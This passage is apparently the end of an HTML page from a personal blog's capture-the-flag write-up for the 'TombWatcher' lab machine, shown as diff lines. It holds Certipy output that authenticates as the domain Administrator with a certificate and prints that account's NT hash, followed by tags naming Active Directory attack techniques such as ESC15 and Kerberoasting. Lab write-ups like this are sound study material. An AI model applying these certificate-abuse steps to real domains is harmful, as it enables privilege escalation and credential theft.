+</span></span><span class="line"><span class="cl">Certipy v5.0.3 - by Oliver Lyak <span class="o">(</span>ly4k<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Certificate identities:
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span>     SAN UPN: <span class="s1">&#39;Administrator@tombwatcher.htb&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span>     Security Extension SID: <span class="s1">&#39;S-1-5-21-1392491010-1358638721-2126982587-500&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Using principal: <span class="s1">&#39;administrator@tombwatcher.htb&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Trying to get TGT...
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Got TGT
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Saving credential cache to <span class="s1">&#39;administrator.ccache&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Wrote credential cache to <span class="s1">&#39;administrator.ccache&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Trying to retrieve NT <span class="nb">hash</span> <span class="k">for</span> <span class="s1">&#39;administrator&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Got <span class="nb">hash</span> <span class="k">for</span> <span class="s1">&#39;administrator@tombwatcher.htb&#39;</span>: aad3b435b51404eeaad3b435b51404ee:f61db423bebe3328d33af26741afe5fc
+</span></span></code></pre></div>
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://borhuub.github.io/tags/medium/">Medium</a></li>
+      <li><a href="https://borhuub.github.io/tags/activedirectory/">ActiveDirectory</a></li>
+      <li><a href="https://borhuub.github.io/tags/kerberoasting/">Kerberoasting</a></li>
+      <li><a href="https://borhuub.github.io/tags/addself/">AddSelf</a></li>
+      <li><a href="https://borhuub.github.io/tags/readgmsapassword/">ReadGMSAPassword</a></li>
+      <li><a href="https://borhuub.github.io/tags/forcechangepassword/">ForceChangePassword</a></li>
+      <li><a href="https://borhuub.github.io/tags/writeowner/">WriteOwner</a></li>
+      <li><a href="https://borhuub.github.io/tags/genericall/">GenericALL</a></li>
+      <li><a href="https://borhuub.github.io/tags/restore-adobject/">Restore-ADObject</a></li>
+      <li><a href="https://borhuub.github.io/tags/esc15/">ESC15</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="https://borhuub.github.io/writeups/rustykey/">
+    <span class="title">« Prev</span>
+    <br>
+    <span>Rustykey</span>
+  </a>
+  <a class="next" href="https://borhuub.github.io/writeups/voleur/">
+    <span class="title">Next »</span>
+    <br>
+    <span>Voleur</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="https://borhuub.github.io/">Borhub Blog</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
